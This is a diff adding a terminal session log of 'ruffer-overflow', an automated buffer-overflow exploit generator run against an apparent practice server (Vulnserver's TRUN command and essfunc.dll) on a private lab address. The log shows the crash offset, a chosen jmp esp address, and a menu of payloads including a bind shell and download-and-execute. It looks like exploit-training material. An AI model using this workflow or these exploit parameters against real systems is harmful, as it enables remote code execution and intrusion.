@@ -1,0 +1,77 @@
+> ../../ruff.py
+           ____,'`-,
+      _,--'   ,/::.;
+   ,-'       ,/::,' `---.___        ___,_
+   |       ,:';:/        ;'"';"`--./ ,-^.;--.
+   |:     ,:';,'         '         `.   ;`   `-.
+    \:.,:::/;/ -:.                   `  | `     `-.
+     \:::,'//__.;  ,;  ,  ,  :.`-.   :. |  ;       :.
+      \,',';/O)^. :'  ;  :   '__` `  :::`.       .:' )
+      |,'  |\__,: ;      ;  '/O)`.   :::`;       ' ,'
+           |`--''            \__,' , ::::(       ,'
+           `    ,            `--' ,: :::,'\   ,-'
+            | ,;         ,    ,::'  ,:::   |,'
+            |,:        .(          ,:::|   `
+            ::'_   _   ::         ,::/:|
+           ,',' `-' \   `.      ,:::/,:|
+          | : _  _   |   '     ,::,' :::
+          | \ O`'O  ,',   ,    :,'   ;::
+           \ `-'`--',:' ,' , ,,'      ::
+            ``:.:.__   ',-','        ::'
+    -hrr-      `--.__, ,::.         ::'
+                   |:  ::::.       ::'
+                   |:  ::::::    ,::'
+########################################################
+#                 ruffer-overflow v0.2                 #
+#           don't "bark" up the wrong tree.            #
+#======================================================#
+#         weak-sauce tool for buffer-overflow          #
+#              please don't crime with it.             #
+########################################################
+
+where is the file located?: secureserverind.exe
+[platform is 32-bit windows]
+is this a command-line application(not a server)?(y/n): n
+[warning: this will run the binary on your local machine, this could put you at risk]
+magically detect ports?(y/n): y
+[starting the binary]
+[using wine]
+[allowing time to start]
+[killing the server]
+[target port 9999]
+what prefix should be used for interaction? (leave blank for none): TRUN /.:/
+[warning: this will run the binary on the local machine]
+are you sure you want to run this binary?(y/n): y
+[starting the server]
+[using wine]
+[allowing time to start]
+[expect some kind of error message, just close it if it pops up]
+[found 386f4337]
+[offset calculated to be 2003]
+are there any dlls associated with this binary? (separate with a space): essfunc.dll
+[locating targetable jump instructions]
+select an instruction to target.
+0)                     625012a0:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+1)                     625012ad:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+2)                     625012ba:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+3)                     625012c7:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+4)                     625012d4:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+5)                     625012e1:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+6)                     625012ee:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+7)                     625012fb:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+8)                     625012fd:        ff e4                   jmp    *%esp    essfunc.dll     0x62501060
+9)                     625012ff:        ff 64 24 f4             jmp    *-0xc(%esp)    essfunc.dll     0x62501060
+: 0
+[selected the instruction in essfunc.dll at 0x625012a0 (0x62501060 + 576]
+select a payload.
+0)      windows/shell_bind_tcp
+1)      windows/exec
+2)      windows/download_exec
+: 1
+what command would you like to be executed?: echo "no standards" > compromise.txt                                                       
+[generating payload]
+what would you like to name the exploit script?: exploit.py
+would you like to adjust target instruction address?(y/n): n
+what address would you like to target?: 192.168.150.245
+what port would you like to target?: 9999
+> 
